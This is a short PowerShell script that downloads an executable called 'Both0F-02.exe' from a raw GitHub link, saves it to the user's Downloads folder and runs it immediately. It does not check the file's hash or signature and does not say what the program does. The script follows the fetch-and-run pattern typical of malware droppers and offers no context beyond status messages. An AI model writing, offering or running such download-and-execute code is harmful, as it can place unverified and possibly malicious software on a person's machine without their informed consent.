# Direct URL to the file on GitHub
$url = "https://github.com/Mouted/Hos/raw/main/Both0F-02.exe"

# Destination path on your machine (in the Downloads folder )
$destination = "$env:USERPROFILE\Downloads\Both0F-02.exe"

# Message to the user
Write-Host "Starting file download..."

# Download the file
Invoke-WebRequest -Uri $url -OutFile $destination

# Message to the user
Write-Host "Download complete. Now running the file..."

# Run the downloaded file
Start-Process -FilePath $destination

# Message to the user
Write-Host "File executed successfully."
